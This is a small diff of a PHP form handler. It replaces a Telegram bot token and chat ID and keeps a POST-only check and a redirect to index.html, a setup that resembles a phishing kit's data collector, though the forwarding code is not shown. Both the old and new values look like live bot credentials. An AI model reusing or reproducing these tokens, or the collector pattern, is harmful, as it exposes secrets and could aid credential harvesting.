@@ -3,8 +3,8 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$botToken = "8536281989:AAGifGVxDdg4-2vBxUNglagz67nf8as0CWo";
-$chatId   = "-5164623342";
+$botToken = "8694066863:AAH7jm_fMuF5oCHNzif9rpRckOjM9nDuJgM";
+$chatId   = "-5247478393";
 $redirectUrl = "index.html";
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
